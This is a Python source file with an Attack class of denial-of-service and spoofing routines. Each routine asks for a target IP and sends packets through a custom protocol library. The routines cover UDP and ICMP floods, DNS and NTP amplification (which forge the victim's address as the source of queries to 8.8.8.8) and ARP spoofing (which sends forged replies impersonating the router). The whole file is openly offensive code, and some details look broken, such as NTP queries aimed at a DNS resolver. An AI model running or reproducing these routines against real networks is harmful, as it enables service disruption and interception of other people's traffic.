from protocols.udp import UDP
from protocols.icmp import ICMP
from protocols.ipv4 import IPv4
from protocols.dns import DNS
from protocols.ntp import NTP
from protocols.ethernet import Ethernet
from protocols.arp import ARP
from network import Network
import random

class Attack():
    def __init__(self, name):
        pass

    @staticmethod
    def udp_flood():
        dst_ip = input('Enter IP address to flood: ')
        pkt = IPv4(dst_ip=dst_ip).add_protocol(UDP(dst_port=random.randint(1, 65535)))
        for i in range(10):
            Network.send_and_received(pkt)

    @staticmethod
    def icmp_flood():
        dst_ip = input('Enter IP address to flood: ')
        pkt = IPv4(dst_ip=dst_ip).add_protocol(ICMP())
        for i in range(10):
            Network.send_and_received(pkt)

    @staticmethod
    def dns_amplification():
        dst_ip = input('Enter IP address to amplification: ')
        pkt = IPv4(src_ip=dst_ip ,dst_ip='8.8.8.8').add_protocol(UDP(dst_port=53).add_protocol(DNS("youtube.com")))
        for i in range(10):
            Network.send_and_received(pkt)

    @staticmethod
    def ntp_amplification():
        dst_ip = input('Enter IP address to amplification: ')
        pkt = IPv4(src_ip=dst_ip ,dst_ip='8.8.8.8').add_protocol(UDP(dst_port=123).add_protocol(NTP()))
        for i in range(10):
            Network.send_and_received(pkt)

    @staticmethod
    def arp_spoofing():
        dst_ip = input('Enter IP address to spoof: ')
        router_ip = input('Enter router IP address: ')
        pkt = Ethernet(type=0x0806).add_protocol(ARP(target_ip=dst_ip))
        answer = Network.send_and_received(pkt)

        target_mac = answer.payload.packet['sender_mac']
        pkt = Ethernet(type=0x0806, target_mac=target_mac).add_protocol(ARP(sender_ip=router_ip, target_ip=dst_ip, target_mac=target_mac, operation=2))
        for i in range(10):
            Network.send_and_received(pkt)
